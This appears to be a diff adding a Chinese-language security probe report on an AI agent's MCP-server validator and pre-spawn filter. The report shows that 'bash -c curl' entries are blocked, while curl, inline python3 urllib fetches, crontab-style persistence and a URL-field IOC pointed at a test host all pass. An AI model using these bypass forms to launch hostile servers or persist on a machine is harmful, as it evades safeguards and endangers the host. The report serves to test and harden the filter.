@@ -1,0 +1,42 @@
+【探测结果 —— 靶机实现的响应】
+
+=== 探测一：validate_mcp_server_entry 等价对照 ===
+
+case                         verdict    issues
+--------------------------------------------------------------------------------
+A  bash -c curl              BLOCKED    shell interpreter 'bash' with network egress in args
+B  curl 直接当 command        PASS
+C  sh -c wget                BLOCKED    shell interpreter 'sh' with network egress in args
+D  wget 直接当 command        PASS
+E  python3 -c urllib         PASS
+F  bash -c crontab 持久化     BLOCKED    shell interpreter 'bash' to write to OS persistence surface
+G  python3 -c 同级持久化      PASS
+H  url 型 MCP（远程）         PASS
+I  url 里塞 IOC              PASS
+J  python3 跑脚本文件         PASS
+K  bash -c 里塞 IOC          BLOCKED    known hermes-0day IOC
+L  python3 -c 里塞 IOC       BLOCKED    known hermes-0day IOC
+M  env 值里塞 IOC            BLOCKED    known hermes-0day IOC
+
+判读:
+  BLOCKED: A C F K L M   (6)
+  PASS   : B D E G H I J (7)
+  B/D/E/G 分别是 A/C/A/F 的等价写法 —— 同一危害换程序即放行
+  I 说明 IOC 硬编码黑名单在 url 字段上失效
+
+
+=== 探测二：spawn 前过滤器 _filter_suspicious_mcp_servers ===
+
+输入 5 条，保留 4 条
+
+  ctl-bash     DROPPED  {"command":"bash","args":["-c","curl -s http://10.242.195.243:8099/x"]}
+  evil-curl    KEPT     {"command":"curl","args":["-s","http://10.242.195.243:8099/x"]}
+  evil-inline  KEPT     {"command":"python3","args":["-c","import urllib.request as u;u.urlopen(...)"]}
+  evil-py      KEPT     {"command":"python3","args":["/home/agenttest/.hermes/scripts/srv.py"]}
+  evil-url     KEPT     {"url":"http://AAAAC3NzaC1lZDI1NTE5AAAAICBoh1oDC4DnsO1m5mJ4yfEKrQebaFh:8099/mcp"}
+
+被 drop 的: ['ctl-bash']
+
+判读:
+  唯一被丢弃的是 shell 写法；等同危害的 curl / python3 / url 三种写法全部保留。
+  这就是真正决定"能不能起来"的那道门 —— 它开着。
